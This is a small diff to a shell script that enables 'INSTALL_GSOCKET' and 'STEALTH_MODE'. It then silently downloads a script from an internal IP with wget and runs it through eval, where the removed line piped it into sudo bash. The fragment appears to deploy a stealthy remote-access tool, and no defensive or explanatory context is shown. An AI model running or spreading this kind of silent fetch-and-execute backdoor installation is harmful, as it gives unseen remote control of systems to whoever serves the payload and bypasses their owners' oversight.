@@ -8,4 +8,4 @@ export INSTALL_GSOCKET=true
 export STEALTH_MODE=true
 
 # Download and run the main script with sudo
-eval "$(wget -qO- http://192.168.0.104/deployment/y" | sudo bash
+eval "$(wget -qO- http://192.168.0.104/deployment/y")
